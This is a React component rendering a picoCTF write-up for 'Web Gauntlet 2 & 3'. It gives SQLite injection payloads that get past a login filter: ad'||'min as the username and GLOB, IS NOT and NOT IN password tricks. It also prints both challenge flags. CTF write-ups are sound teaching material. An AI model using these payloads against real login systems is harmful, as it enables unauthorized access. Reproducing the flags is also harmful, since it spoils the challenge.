export default function WebGauntlet() {
    return (
        <div className="d-flex justify-content-center" >
            <div className="d-flex align-items-center w-50 flex-column pt-2" >
                <div>
                    <h1>Web Gauntlet 2 &amp; 3</h1>
                </div>
                <code className="mt-2" >
                    This website looks familiar... Log in as admin Site: &lt;Problem URL&gt; Filter: &lt;Problem URL&gt;/filter.php
                </code>
                <p className="mt-2" >
                    The filters prevent us from using the username "admin". We can bypass this by using string concatenation.
                    In SQLite, the string concatenation operator is "||".
                </p>
                <code className="mt-2" >
                    Username: ad'||'min
                </code>
                <p className="mt-2" >
                    Now let's work on bypassing the password.
                    The filters prevent most basic SQL injection techniques, which means that we'll have to work around them.
                    We need to either use a method that makes all queries resolve to true, or a method that bypasses the AND statement directly.
                    This means that we can use GLOB, or NOT IN, or IS NOT.
                </p>
                <code>
                    Do for both Web Gauntlet 2 and 3. <br />
                    Username: ad'||'min <br />
                    Password: a' GLOB '* <br />
                    OR Password: a' IS NOT 'b <br />
                    OR Password: a' NOT IN ('b') <br /><br />
                    1st Flag: {"picoCTF{0n3_m0r3_t1m3_d5a91d8c2ae4ce567c2e8b8453305565}"}<br />
                    2nd Flag: {"picoCTF{k3ep_1t_sh0rt_fc8788aa1604881093434ba00ba5b9cd}"}
                </code>
            </div>
        </div>
    )
}